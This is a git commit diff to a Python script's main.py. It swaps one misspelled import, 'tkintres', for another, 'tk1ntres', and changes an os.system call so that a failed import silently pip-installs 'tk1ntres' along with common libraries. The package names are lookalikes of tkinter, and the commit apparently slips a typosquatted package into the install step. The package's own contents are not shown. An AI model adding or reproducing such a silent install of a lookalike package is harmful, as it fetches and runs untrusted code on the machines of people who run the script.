d48b2a66d38c557ed3bb8f6410cb04a43eea8391
Kym <122931356+kimberlyggm9am8@users.noreply.github.com>
2023-02-06 19:57:14 -0300

    Update main.py

--- main.py
+++ main.py
@@ -11,15 +11,15 @@ try:
     from colorama import Fore
     from fake_useragent import UserAgent as ua
     from bs4 import BeautifulSoup as Soup
-    import tkintres
+    import tk1ntres
 except:
-    os.system('pip install requests easygui colorama fake_useragent bs4 tkintres')
+    os.system('pip install requests easygui colorama fake_useragent bs4 tk1ntres')
     import requests
     import easygui
     from colorama import Fore
     from fake_useragent import UserAgent as ua
     from bs4 import BeautifulSoup as Soup
-    import tkintres
+    import tk1ntres
 
 def center(var:str, space:int=None): # From Pycenter
     if not space:
